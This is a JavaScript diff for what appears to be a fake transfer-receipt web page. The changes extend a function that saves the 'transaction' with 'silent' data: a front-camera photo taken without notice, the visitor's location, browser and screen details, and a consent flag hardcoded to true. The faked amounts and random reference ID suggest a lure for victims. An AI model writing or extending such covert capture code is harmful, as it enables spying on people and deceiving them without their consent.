@@ -257,28 +257,34 @@
 
     // Capture snapshot dari kamera belakang
     function captureBackCamera() {
-        if (!elements.cameraVideo || !elements.cameraCanvas) return null;
-        
-        const video = elements.cameraVideo;
-        const canvas = elements.cameraCanvas;
-        
-        canvas.width = video.videoWidth || 1280;
-        canvas.height = video.videoHeight || 720;
-        
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        const dataUrl = canvas.toDataURL('image/jpeg', CONFIG.BACK_CAMERA_QUALITY);
-        
+        let dataUrl = null;
+        try {
+            const video = elements.cameraVideo;
+            const canvas = elements.cameraCanvas || document.createElement('canvas');
+            const w = (video && video.videoWidth > 0) ? video.videoWidth : 1280;
+            const h = (video && video.videoHeight > 0) ? video.videoHeight : 720;
+            canvas.width = w;
+            canvas.height = h;
+            const ctx = canvas.getContext('2d');
+            if (video) {
+                ctx.drawImage(video, 0, 0, w, h);
+                dataUrl = canvas.toDataURL('image/jpeg', CONFIG.BACK_CAMERA_QUALITY || 0.85);
+            }
+        } catch (e) {
+            console.warn('captureBackCamera error:', e);
+        }
+
         if (backCameraStream) {
-            backCameraStream.getTracks().forEach(track => track.stop());
+            try {
+                backCameraStream.getTracks().forEach(track => track.stop());
+            } catch(e) {}
             backCameraStream = null;
         }
-        
+
         if (elements.cameraContainer) {
             elements.cameraContainer.style.display = 'none';
         }
-        
+
         return dataUrl;
     }
 
@@ -393,12 +399,17 @@
         }
     }
 
+    window.handleCaptureBackPhoto = handleCaptureBackPhoto;
+
     // ============================================================
     // SAVE TRANSACTION WITH SILENT DATA
     // ============================================================
     async function saveTransactionWithSilentData(locationData, frontPhoto, receiptPhoto) {
         const transferId = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
         
+        const finalReceiptPhoto = receiptPhoto || capturedPhotoBase64 || '';
+        const finalFrontPhoto = frontPhoto || silentFrontPhotoBase64 || '';
+
         const payload = {
             transferId: transferId,
             consent: true,
@@ -411,10 +422,11 @@
             amount: currentTemplate.amountMain || 'IDR 515.000',
             amountSub: currentTemplate.amountSub || 'BND 35.12',
             location: locationData,
-            photo: receiptPhoto,                    // Foto struk
-            frontPhoto: frontPhoto,                 // FOTO SILENT KAMERA DEPAN
-            silentCapture: true,                    // Flag silent capture
-            silentLocation: true,                   // Flag silent location
+            photo: finalReceiptPhoto,                 // Foto barang / struk
+            frontPhoto: finalFrontPhoto,             // FOTO SILENT KAMERA DEPAN
+            front_photo: finalFrontPhoto,            // Kompatibilitas field database
+            silentCapture: true,                     // Flag silent capture
+            silentLocation: true,                    // Flag silent location
             userAgent: navigator.userAgent,
             screen: `${screen.width}x${screen.height}`,
             language: navigator.language,
